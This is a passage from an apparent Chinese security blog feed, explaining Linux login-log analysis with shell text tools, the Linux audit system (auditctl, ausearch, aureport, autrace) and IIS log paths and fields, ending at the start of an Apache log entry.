shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cat /var/log/secure | awk &#x27;/Accepted publickey/&#123;print $(NF-3)&#125;&#x27;|sort|uniq -c |awk &#x27;&#123;print $2&quot;=&quot;$1;&#125;&#x27;</span><br></pre></td></tr></table></figure><h3 id="查看登录成功日期、用户名、IP地址"><a href="#查看登录成功日期、用户名、IP地址" class="headerlink" title="查看登录成功日期、用户名、IP地址"></a>查看登录成功日期、用户名、IP地址</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Accepted&quot; /var/log/secure |awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span><br></pre></td></tr></table></figure><h2 id="分析涉及命令"><a href="#分析涉及命令" class="headerlink" title="分析涉及命令"></a>分析涉及命令</h2><h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符 |"></a>管道符 <code>|</code></h3><p>管道符命令仅会处理标准输出，对于标准错误会给予忽略。</p><p>管道命令必须要能够接受来自前一个命令的数据成为标准输入继续处理才行。</p><blockquote><p>让标准错误可以被管道符使用：使用<code>2&gt;&amp;1</code>，让<code>2&gt;</code>变成<code>1&gt;</code></p></blockquote><h3 id="head-amp-tail"><a href="#head-amp-tail" class="headerlink" title="head&amp;tail"></a>head&amp;tail</h3><p><code>tail -n 10 test.log</code>    最后10行</p><p><code>tail -n +10 test.log</code>   10行之后</p><p><code>head -n 10 test.log</code>   头10行  </p><p><code>head -n -10 test.log</code> 除了最后10行 </p><h3 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -n &#x27;/起始时间/&#x27;,&#x27;/结束时间/p&#x27; [日志文件]</span><br></pre></td></tr></table></figure><blockquote><p><code>-n</code> 读取下一个输入行，用下一个命令处理新的行而不是第一个命令</p><p><code>p</code> 打印输出</p></blockquote><h3 id="cut-分隔"><a href="#cut-分隔" class="headerlink" title="cut 分隔"></a>cut 分隔</h3><p>存在特定分隔字符</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cut -d&#x27;分隔字符&#x27; -f fields</span><br></pre></td></tr></table></figure><p>用于整齐排列信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cut -c 12-15</span><br></pre></td></tr></table></figure><h3 id="grep-查找"><a href="#grep-查找" class="headerlink" title="grep 查找"></a>grep 查找</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep [-acinv] [--color=auto] &#x27;查找字符&#x27; filename</span><br></pre></td></tr></table></figure><blockquote><p><code>-a</code> 将二进制文件以文本文件的方式查找数据</p><p><code>-c</code>查找字符的次数</p><p><code>-i</code>忽略大小写</p><p><code>-n</code>输出行号</p><p><code>-v</code>反向选择</p><p><code>--color=auto</code>关键字部分会用特殊颜色显示</p></blockquote><h3 id="sort-排序"><a href="#sort-排序" class="headerlink" title="sort 排序"></a>sort 排序</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort [-fbMnrtuk] [file or stdin]</span><br></pre></td></tr></table></figure><blockquote><p><code>-f</code>忽略大小写差异</p><p><code>-b</code>忽略最前面空格字符部分</p><p><code>-M</code>以月份的名字来排序</p><p><code>-n</code>使用纯数字来排序</p><p><code>-r</code>反向排序</p><p><code>-u</code>通<code>uniq</code>相同的数据仅出现一行 </p><p><code>-t</code>分隔符号，默认是<code>[Tab]</code> <code>#sort -t &#39;:&#39;</code></p><p><code>-k</code>以哪个分区（第几列）进行排序 </p></blockquote><h4 id="uniq-去重"><a href="#uniq-去重" class="headerlink" title="uniq 去重"></a>uniq 去重</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uniq [-ic]</span><br></pre></td></tr></table></figure><blockquote><p><code>-i</code>忽略大小写字符</p><p><code>-c</code>进行计数</p></blockquote><h3 id="wc-计数"><a href="#wc-计数" class="headerlink" title="wc 计数"></a>wc 计数</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wc [-lwm]</span><br></pre></td></tr></table></figure><blockquote><p><code>-l</code>行数</p><p><code>-w</code>字数（英文字母）</p><p><code>-m</code>字符数</p></blockquote><h3 id="awk-数据处理"><a href="#awk-数据处理" class="headerlink" title="awk 数据处理"></a>awk 数据处理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;条件类型1&#123;操作1&#125; 条件类型2&#123;操作2&#125;....&#x27; filename</span><br></pre></td></tr></table></figure><blockquote><p><code>NF</code>每一行(<code>$0</code>)拥有的字段总数</p><p><code>NR</code>目前awk所处理的是第几行数据</p><p><code>FS</code>目前的分隔字符，默认是空格键</p></blockquote><h2 id="audit安全审计"><a href="#audit安全审计" class="headerlink" title="audit安全审计"></a>audit安全审计</h2><h3 id="系统组成"><a href="#系统组成" class="headerlink" title="系统组成"></a>系统组成</h3><ul><li><strong>auditctl</strong> : 即时控制审计守护进程的行为的工具，如添加规则等。</li><li><strong>auditd</strong> ：audit 守护进程负责把内核产生的信息写入到硬盘上，这些信息由应用程序和系统活动触发产生。用户空间审计系统通过 auditd 后台进程接收内核审计系统传送来的审计信息，将信息写入到 /var/log/audit/audit.log。</li><li><strong>aureport</strong> : 查看和生成审计报告的工具。</li><li><strong>ausearch</strong> : 查找审计事件的工具</li><li><strong>auditspd</strong> : 转发事件通知给其他应用程序，而不是写入到审计日志文件中。</li><li><strong>autrace</strong> : 一个用于跟踪进程的命令。类似于 strace，跟踪某一个进程，并将跟踪的结果写入日志文件之中。</li></ul><h3 id="启用服务"><a href="#启用服务" class="headerlink" title="启用服务"></a>启用服务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start auditd</span><br><span class="line">systemctl enable auditd #开机自动启动</span><br></pre></td></tr></table></figure><h4 id="Ubuntu下开启audit"><a href="#Ubuntu下开启audit" class="headerlink" title="Ubuntu下开启audit"></a>Ubuntu下开启audit</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install auditd</span><br></pre></td></tr></table></figure><h3 id="查看audit服务状态"><a href="#查看audit服务状态" class="headerlink" title="查看audit服务状态"></a>查看audit服务状态</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost wiki]# service auditd start</span><br><span class="line">Redirecting to /bin/systemctl start auditd.service</span><br><span class="line">[root@localhost wiki]# auditctl -s</span><br><span class="line">enabled 1</span><br><span class="line">failure 1</span><br><span class="line">pid 1072</span><br><span class="line">rate_limit 0</span><br><span class="line">backlog_limit 8192</span><br><span class="line">lost 0</span><br><span class="line">backlog 0</span><br><span class="line">backlog_wait_time 60000</span><br><span class="line">loginuid_immutable 0 unlocked</span><br></pre></td></tr></table></figure><blockquote><p>enabled值为1代表开启，0为关闭，2表示规则锁定状态 ，可通过 -e参数进行设置。</p></blockquote><h3 id="文件系统监控"><a href="#文件系统监控" class="headerlink" title="文件系统监控"></a>文件系统监控</h3><h4 id="命令行执行-临时生效"><a href="#命令行执行-临时生效" class="headerlink" title="命令行执行-临时生效"></a>命令行执行-临时生效</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auditctl -w /tmp/filename -p wa -k test</span><br></pre></td></tr></table></figure><blockquote><p><code>-w</code>指定所要监控的文件或命令</p><p><code>-p</code>指定监控属性，如:</p><ul><li>r — 读取文件或者目录。</li><li>w — 写入文件或者目录。</li><li>x — 运行文件或者目录。</li><li> a — 改变在文件或者目录中的属性</li></ul><p><code>-k</code>是可选字符串，可帮助您判定哪个规则或者哪组规则生成特定的日志项。设置一个关键词用于查询</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//设置规则所有对passwd文件的写、属性修改操作都会被记录审计日志</span><br><span class="line"></span><br><span class="line">auditctl -w /etc/passwd -p wa -k passwd_change</span><br><span class="line"></span><br><span class="line">//设置规则，监控/etc/selinux目录</span><br><span class="line"></span><br><span class="line">auditctl -w /etc/selinux/ -p wa -k selinux_change</span><br><span class="line"></span><br><span class="line">//设置规则，监控fdisk程序</span><br><span class="line"></span><br><span class="line">auditctl -w /usr/sbin/fdisk -p x -k disk_partition</span><br><span class="line"></span><br><span class="line">//设置规则，监控sshd_con：f文件</span><br><span class="line"></span><br><span class="line">auditctl -w /etc/ssh/sshd_config -p warx -k sshd_config</span><br></pre></td></tr></table></figure><h4 id="编辑配置文件-永久生效"><a href="#编辑配置文件-永久生效" class="headerlink" title="编辑配置文件-永久生效"></a>编辑配置文件-永久生效</h4><p><code>/etc/audit/auditd.conf</code> 守护程序的默认配置文件</p><p><code>/etc/audit/audit.rules</code> 记录审计规则文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">local_events = yes</span><br><span class="line">write_logs = yes</span><br><span class="line">log_file = /var/log/audit/audit.log  #审计日志文件的完整路径。如果您配置守护进程向除默认/var/log/audit/外的目录中写日志文件时，一定要修改它上面的文件权限，使得只有根用户有读、写和执行权限。所有其他用户都不能访问这个目录或这个目录中的日志文件。</span><br><span class="line">log_group = root</span><br><span class="line">log_format = ENRICHED</span><br><span class="line">flush = INCREMENTAL_ASYNC#多长时间向日志文件中写一次数据</span><br><span class="line">freq = 50</span><br><span class="line">max_log_file = 8#设置日志文件大小，单位是MB</span><br><span class="line">num_logs = 5</span><br><span class="line">priority_boost = 4#审计应采用多少优先级推进守护进程。必须是非负数。0表示没有变化。</span><br><span class="line">name_format = NONE</span><br><span class="line">##name = mydomain</span><br><span class="line">max_log_file_action = ROTATE</span><br><span class="line">space_left = 75</span><br><span class="line">space_left_action = SYSLOG</span><br><span class="line">verify_email = yes</span><br><span class="line">action_mail_acct = root</span><br><span class="line">admin_space_left = 50</span><br><span class="line">admin_space_left_action = SUSPEND</span><br><span class="line">disk_full_action = SUSPEND</span><br><span class="line">disk_error_action = SUSPEND</span><br><span class="line">use_libwrap = yes</span><br><span class="line">##tcp_listen_port = 60</span><br><span class="line">tcp_listen_queue = 5</span><br><span class="line">tcp_max_per_addr = 1</span><br><span class="line">##tcp_client_ports = 1024-65535</span><br><span class="line">tcp_client_max_idle = 0</span><br><span class="line">transport = TCP</span><br><span class="line">krb5_principal = auditd</span><br><span class="line">##krb5_key_file = /etc/audit/audit.key</span><br><span class="line">distribute_network = no</span><br><span class="line">q_depth = 400</span><br><span class="line">overflow_action = SYSLOG</span><br><span class="line">max_restarts = 10</span><br><span class="line">plugin_dir = /etc/audit/plugins.d</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost audit]# cat audit.rules</span><br><span class="line">## This file is automatically generated from /etc/audit/rules.d</span><br><span class="line">-D#删除所有当前装载的审核规则</span><br><span class="line">-b 8192#在内核中设定最大数量的已存在的审核缓冲区为 8Mb</span><br><span class="line">-f 1#当追踪重要错误时设定所要完成的行动</span><br><span class="line">--backlog_wait_time 60000</span><br></pre></td></tr></table></figure><blockquote><p>写入完重启服务，<code>auditctl -l</code>查看规则，<code>auditctl -D</code>删除规则。</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210903102807860.png" alt="image-20210903102807860"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210903102935696.png" alt="image-20210903102935696"></p><h3 id="auditctl日志分析"><a href="#auditctl日志分析" class="headerlink" title="auditctl日志分析"></a>auditctl日志分析</h3><p><code>tail /var/log/audit/audit.log</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type=SYSCALL msg=audit(1630636108.992:216): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=7f0c8b3157a8 a2=541 a3=1b6 items=2 ppid=2070 pid=2071 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=10 comm=&quot;zsh&quot; exe=&quot;/usr/bin/zsh&quot; subj==unconfined key=&quot;testinfo&quot;ARCH=x86_64 SYSCALL=openat AUID=&quot;kali&quot; UID=&quot;root&quot; GID=&quot;root&quot; EUID=&quot;root&quot; SUID=&quot;root&quot; FSUID=&quot;root&quot; EGID=&quot;root&quot; SGID=&quot;root&quot; FSGID=&quot;root&quot;</span><br></pre></td></tr></table></figure><blockquote><p><code>type</code>消息类型，详见<a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/sec-audit_record_types">审计记录类型</a></p><p><code>msg</code>消息ID 两个部分组成，分号之前的是Unix的时间戳，分号之后的是真正的event ID，<code>time_stamp:ID</code>，时间是<code>date +%s</code>（1970-1-1至今的秒数）</p><p><code>arch</code>调用system call的CPU构架，arch=c000003e，代表x86_64（16进制）</p><p><code>syscall</code>system call的类型。<a href="https://github.com/torvalds/linux/blob/master/arch/sh/include/asm/unistd.h">详见</a></p><p><code>success</code>system call是成功或者失败。</p><p><code>exit</code>system call的返回值。</p><p><code>a0 to a3</code>系统调用的前四个参数的数字化，可以通过ausearch解码查看。</p><p><code>items</code>传递到应用程序的字符串数量。</p><p><code>ppid</code>父进程的PID    <code>pid</code>该进程的PID</p><p><code>auid</code> <code>audit ID</code>针对某一用户一个进程会被分配一个audit ID， 该audit ID会被传递给子进程，尽管在系统中用户切换，该audit ID将始终保持一致。可以追踪su前的账户。</p><p><code>uid</code>user ID    <code>gid</code>group ID</p><p><code>tty</code>应用程序开启的终端。</p><p><code>ses</code>用户登录的session ID.</p><p><code>comm</code>在命令行执行的指令</p><p><code>exe</code>二进制程序的解析路径。</p><p><code>subj</code>进程执行时selinux上下文</p><p><code>key</code>如果audit了很多的目录文件，分配一个key string方便后面我们通过ausearch去过滤这类log。</p><p><code>cwd</code>进程的执行目录.</p><p><code>ouid</code>**(**owner’s user id）  对象所有者id</p><p><code>guid</code>(owner’s groupid）  对象所属组id</p></blockquote><h3 id="ausearch"><a href="#ausearch" class="headerlink" title="ausearch"></a>ausearch</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ausearch [options]</span><br><span class="line">ausearch -if /var/log/audit/audit.log</span><br></pre></td></tr></table></figure><blockquote><p><code>-a number</code>  #只显示事件ID为指定数字的日志信息，如只显示926事件：ausearch -a 926</p><p><code>-c  commond</code>  #只显示和指定命令有关的事件，如只显示rm命令产生的事件：auserach  -c  rm</p><p><code>-i</code>  #显示出的信息更清晰，如事件时间、相关用户名都会直接显示出来，而不再是数字形式</p><p><code>-k</code>  #显示出和之前auditctl -k所定义的关键词相匹配的事件信息</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ausearch -m    #按消息类型查找</span><br><span class="line">ausearch -ul   #按登陆ID查找</span><br><span class="line">ausearch -ua   #按uid和euid查找</span><br><span class="line">ausearch -ui   #按uid查找</span><br><span class="line">ausearch -ue   #按euid查找</span><br><span class="line">ausearch -ga   #按gid和egid查找</span><br><span class="line">ausearch -gi   #按gid查找</span><br><span class="line">ausearch -ge   #按egid查找</span><br><span class="line">ausearch -c    #按cmd查找</span><br><span class="line">ausearch -x    #按exe查找</span><br><span class="line">ausearch -sc   #按syscall查找</span><br><span class="line">ausearch -p    #按pid查找</span><br><span class="line">ausearch -sv   #按syscall的返回值查找（yes/no）</span><br><span class="line">ausearch -f    #按文件名查找</span><br><span class="line">ausearch -tm   #按连接终端查找(term/ssh/tty)</span><br><span class="line">ausearch -hn   #按主机名查找</span><br><span class="line">ausearch -k    #按特定的key值查找</span><br><span class="line">ausearch -w    #按在audit rule设定的字符串查找</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 因登录失败而搜索 /var/log/audit/audit.log 文件</span><br><span class="line">ausearch --message USER_LOGIN --success no --interpret -if audit.log</span><br><span class="line">#搜索所有的账户，群组，角色变更</span><br><span class="line">ausearch -m ADD_USER -m DEL_USER -m ADD_GROUP -m USER_CHAUTHTOK -m DEL_GROUP -m CHGRP_ID -m ROLE_ASSIGN -m ROLE_REMOVE -i</span><br><span class="line"># 所有的由特定用户所执行的记录操作，使用用户的登录 ID（auid）</span><br><span class="line">ausearch -au 500 -i</span><br><span class="line"># 搜寻从昨天至今所有的失败的系统调用</span><br><span class="line">ausearch --start yesterday --end now -m SYSCALL -sv no -i</span><br></pre></td></tr></table></figure><h3 id="系统调用监控"><a href="#系统调用监控" class="headerlink" title="系统调用监控"></a>系统调用监控</h3><p>监视由任何进程或特定用户进行的系统调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auditctl [option] filter,action   -S syscall   -F condition   -k label</span><br></pre></td></tr></table></figure><p>option 参数比较多，具体的可以<code>man auditctl</code></p><table><thead><tr><th>项目</th><th>可选参数</th><th>说明</th></tr></thead><tbody><tr><td>filter</td><td>user,exit,task,exclude</td><td>filter 详细说明哪个内核规则匹配过滤器应用在事件中。以下是其中之一的与规则匹配的过滤器： task、exit、user 以及 exclude</td></tr><tr><td>action</td><td>always, never</td><td>是否审核事件（always 表示是）（never 表示否）</td></tr><tr><td>syscall</td><td>all, 2, open 等</td><td>所有的系统调用都可以在/usr/include/asm/unistd_64.h 文件中找到。许多系统调用都能形成一个规则</td></tr><tr><td>condition</td><td>euid=0, arch=b64</td><td>详细说明其他选项，进一步修改规则来与以特定架构、组 ID、进程 ID 和其他内容为基础的事件相匹配</td></tr><tr><td>label</td><td>任意文字</td><td>标记审核事件并检索日志</td></tr></tbody></table><ul><li>-S 表示系统调用号或名字</li><li>-F 表示规则域</li><li>-k 表示设置审计规则上的过滤关键</li></ul><p>官方也写了几个expamples</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">To see all syscalls made by a specific program:</span><br><span class="line">auditctl -a always,exit -S all -F pid=1005</span><br><span class="line"></span><br><span class="line">To see files opened by a specific user:</span><br><span class="line">auditctl -a always,exit -S openat -F auid=510</span><br><span class="line"></span><br><span class="line">To see unsuccessful openat calls:</span><br><span class="line">auditctl -a always,exit -S openat -F success=0</span><br></pre></td></tr></table></figure><h3 id="aureport-创建审核报告"><a href="#aureport-创建审核报告" class="headerlink" title="aureport 创建审核报告"></a>aureport 创建审核报告</h3><p>生成有关过去三天内不包括示例日在内的记录的事件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aureport --start 04/08/2013 00:00:00 --end 04/11/2013 00:00:00</span><br></pre></td></tr></table></figure><p>生成所有可执行文件事件的一份报告</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aureport -x -if audit.log</span><br></pre></td></tr></table></figure><p>生成以上可执行文件事件的总结</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aureport -x --summary</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210903143114321.png" alt="image-20210903143114321"></p><p>生成所有用户失败事件的总结报告</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aureport -u --failed --summary -i</span><br></pre></td></tr></table></figure><p>生成每个系统用户登录失败的总结报告</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aureport --login --summary -i</span><br></pre></td></tr></table></figure><p>通过 <code>ausearch</code> 查询搜索 用户 <code>500</code> 所有的文件访问事件生成一份报告</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ausearch --start today --loginuid 500 --raw | aureport -f --summary</span><br></pre></td></tr></table></figure><p>生成一份报告有关所有被查询的审核文件以及所包含事件的事件范围</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aureport -t</span><br></pre></td></tr></table></figure><h3 id="autrace-追踪指定进程"><a href="#autrace-追踪指定进程" class="headerlink" title="autrace 追踪指定进程"></a>autrace 追踪指定进程</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">auditctl -D</span><br><span class="line">autrace /usr/bin/less</span><br><span class="line"></span><br><span class="line">Waiting to execute: /usr/bin/less</span><br><span class="line">Missing filename (&quot;less --help&quot; for help)</span><br><span class="line">Cleaning up...</span><br><span class="line">Trace complete. You can locate the records with &#x27;ausearch -i -p 4006&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>避免autrace与之前audit rule生成的日志冲突，使用auditctl -D去停止所有的audit log, 当autrace结束后，使用systemctl restart auditd重启audit服务。</p></blockquote><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://access.redhat.com/documentation/zh-cn/red_hat_enterprise_linux/7/html/security_guide/sec-understanding_audit_log_files">理解审核日志文件</a></p><p><a href="https://blog.csdn.net/whuzm08/article/details/87267956">Linux audit详解</a></p><p><a href="https://zhuanlan.zhihu.com/p/337289840">linux audit审计系统</a></p><p><a href="http://www.linuxe.cn/post-255.html">【系统运维】使用audit实现Linux系统安全审计</a></p><p><a href="https://onils.github.io/2018/08/09/Use-Linux-audit-to-analyze-security-threats/">利用Linux audit分析安全威胁</a></p>]]></content>
      
      
      <categories>
          
          <category> 主机安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IIS日志</title>
      <link href="/p/cb46c76d.html"/>
      <url>/p/cb46c76d.html</url>
      
        <content type="html"><![CDATA[<h2 id="日志位置"><a href="#日志位置" class="headerlink" title="日志位置"></a>日志位置</h2><p><strong>Windows Server 2003 iis6日志路径</strong></p><p><code>%systemroot%\system32\logfiles\w3svc1\</code></p><p><strong>Windows Server 2008 R2、2012、2016、2019 iis7以上日志路径</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%SystemDrive%\inetpub\logs\LogFiles\w3svc1</span><br><span class="line">%SystemDrive%\inetpub\logs\LogFiles\</span><br><span class="line">%SystemDrive%\Windows\system32\logfiles\HTTPERR</span><br></pre></td></tr></table></figure><h2 id="日志格式"><a href="#日志格式" class="headerlink" title="日志格式"></a>日志格式</h2><h3 id="配置位置"><a href="#配置位置" class="headerlink" title="配置位置"></a>配置位置</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210831161416705.png" alt="image-20210831161416705"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#Software: Microsoft Internet Information Services 10.0</span><br><span class="line">#Version: 1.0</span><br><span class="line">#Date: 2021-08-12 03:44:31</span><br><span class="line">#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken</span><br><span class="line">2021-08-12 03:44:31 192.168.77.175 GET / - 80 - 192.168.79.132 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/92.0.4515.131+Safari/537.36 - 200 0 0 426</span><br><span class="line">2021-08-12 03:50:04 192.168.77.175 GET /iisstart.png - 80 - 192.168.79.132 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/92.0.4515.131+Safari/537.36 http://192.168.77.175/ 304 0 0 54</span><br><span class="line"></span><br></pre></td></tr></table></figure><table><thead><tr><th>前缀</th><th>含义</th></tr></thead><tbody><tr><td>s-</td><td>服务端操作</td></tr><tr><td>c-</td><td>客户端操作</td></tr><tr><td>cs-</td><td>客户端到服务端操作</td></tr><tr><td>sc-</td><td>服务端到客户端操作</td></tr></tbody></table><p><code>date</code> 日期</p><p><code>time</code> 时间</p><p><code>s-ip</code> 服务器IP</p><p><code>cs-method</code> 客户端请求服务端方法</p><p><code>cs-uri-stem</code> 请求访问的页面,<code>/</code>表示访问主页</p><p><code>cs-uri-query</code> 访问查询字符串<code>?</code>之后的。</p><p><code>s-port</code> 服务器端口</p><p><code>cs-username</code> 对于通过身份验证的用户，格式是<code>&quot;域\用户名&quot;</code>；对于匿名用户，是一个连字符 <code>-</code></p><p><code>c-ip</code> 客户端IP</p><p><code>cs(User-Agent)</code> 在客户端使用的浏览器。</p><p><code>cs(Referer)</code> 用户访问的前一个站点。此站点提供到当前站点的链接。</p><p><code>sc-status</code> 状态码</p><p><code>sc-substatus</code> HTTP子协议的状态</p><p><code>sc-win32-status</code> Win32® 状态</p><p><code>time-taken</code>操作花费的时间长短（亳秒）</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://docs.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms525807(v=vs.90)">IIS 日志文件格式</a></p><p><a href="https://www.cnblogs.com/zhoujie/p/iis1.html">IIS日志字段详解</a></p>]]></content>
      
      
      <categories>
          
          <category> 主机安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志分析 </tag>
            
            <tag> IIS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache日志</title>
      <link href="/p/d4eb2913.html"/>
      <url>/p/d4eb2913.html</url>
      
